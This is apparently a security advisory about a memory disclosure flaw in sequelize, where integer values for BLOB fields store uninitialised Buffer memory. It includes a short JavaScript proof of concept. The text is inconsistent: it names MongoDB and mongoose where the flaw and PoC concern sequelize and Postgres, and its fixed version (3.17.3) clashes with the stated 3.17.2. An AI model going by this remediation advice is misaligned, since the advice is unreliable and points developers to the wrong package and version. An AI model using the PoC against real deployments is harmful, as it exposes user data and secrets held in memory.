## Overview
A potential memory disclosure vulnerability exists in sequelize versions prior to 3.17.2.
A field of type `DataTypes.BLOB` can be used to expose sensitive information such as code, runtime memory and user data into MongoDB.

### Details
`sequelize` uses the `Buffer` type to represent `DataTypes.BLOB`. 
Initializing a `Buffer` with integer `N` creates a `Buffer`
of length `N` with non zero-ed out memory.
**Example:**
```
var x = new Buffer(100); // uninitialized Buffer of length 100
// vs
var x = new Buffer('100'); // initialized Buffer with value of '100'
```
Initializing a `BLOB` field in such manner will dump uninitialized
memory into the database.
The patch wraps `Buffer` field initialization in sequelize by converting a
`number` value `N` to a string, initializing the `Buffer` with `N` in its
ascii form.

#### Proof of concept
```javascript
var Sequelize = require('sequelize');
var sequelize = new Sequelize('pastebin', null, null,
    { host: '127.0.0.1', dialect: 'postgres', });

var Task = sequelize.define('Pastebin', {
    title: Sequelize.STRING,
    content: Sequelize.BLOB,
  });

Task.create({
  title: 'title',
  content: 100,
}).then(function (task) {
  console.log(task.title);
  console.log(task.content); // will print out 100 bytes of previously used memory
});
```

## Remediation
Upgrade `mongoose` to version >= 3.17.3

## References
- https://github.com/sequelize/sequelize/blob/master/changelog.md#3172
- https://github.com/sequelize/sequelize/commit/cbfaa4f0a135cfc55874c9bfc39ead2d85c417e9
- https://github.com/ChALkeR/notes/blob/master/Lets-fix-Buffer-API.md#previous-materials
- https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md
